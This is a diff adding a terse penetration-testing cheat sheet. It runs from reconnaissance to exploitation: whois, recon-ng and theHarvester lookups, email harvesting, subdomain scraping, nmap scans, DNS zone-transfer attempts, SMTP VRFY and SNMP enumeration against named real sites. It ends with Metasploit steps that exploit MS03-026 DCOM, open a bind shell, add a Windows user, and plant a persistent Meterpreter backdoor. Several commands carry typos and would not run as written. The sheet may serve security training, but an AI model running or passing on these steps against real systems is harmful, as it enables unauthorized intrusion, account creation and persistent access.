@@ -1,0 +1,93 @@
+whois::
+apt-get install whois
+
+whois iacsd.com
+whois (ipaddresss)
+----------------------------
+recong-ng::
+apt-get install python3-pip
+apt-get install git
+git clone https://LaNMaSterR53@bitbucket.org/LaNMasteR53/recon-ng.git
+cd recong-ng
+./recon-ng
+use recon/domains-hosts/hackertarget
+SHOW options
+set SOURCE checkpoint.com(any_sites_name)
+SHOW options
+run
+--------------------------------
+email harvesting::
+kali#theharvester -d checkpoint.com(any_site_name) -l 500 -b all
+--------------------------------
+findout subdomains::
+mkdir demo
+cd demo/
+(goto site copy the URL and use it on wget such as)
+wget http://www.paltalk.com
+cat index.html | grep href= | cut -d"/" -f3 | grep .paltalk.com$ | sort -u
+--------------------------------------
+scanning-host discovery::(identify alive hosts in network)
+apt install nmap
+nmap -sn 192.168.1.0/24(network_range)
+---------------------------------------
+port discovery::
+nmap (ip_address)
+------------------------------------------
+banner grabbing/ service version detection
+nmap -sV (ip_address)
+-----------------------------------------
+DNS Enummeration::
+nslookup
+set type=ns
+iacsd.com
+server (name_server_name)
+ls -d iacsd.com 
+exit
+-----------------------------------------
+SMTP Enummeration::
+nslookup
+set type=mx
+iacsd.com
+telnet mx5.net4india.com
+VRFY root@iacsd.com
+
+echlo 8.8.8.8
+help
+--------------------------------------------
+SNMP Enummeration::
+kali#nmap -sU 192.168.1.22
+snmpwalk -c public -v1 192.168.1.22
+snmpcheck -t 192.168.1.22
+--------------------------------------------
+OS Detection::
+nmap -O 192.168.1.201
+--------------------------------------------
+Metasploit::
+
+msfconsole
+search ms03-026
+use exploit/windows/d-cerpc/ms03-026_dcom
+show options
+set (RHOST_ip_of_target_m/c)
+set payload
+windows/shell/tcp_bind
+show options
+exploit
+=========
+set payload windows/adduser
+set user
+exploit
+=========
+set payload windows/meterpreter/bind_tcp
+show options
+exploit
+sysinfo
+background
+session -l
+get pid
+get uid
+ps
+run metsvc (for creating backdoor)
+screenshort
+----------------------------------------------
+
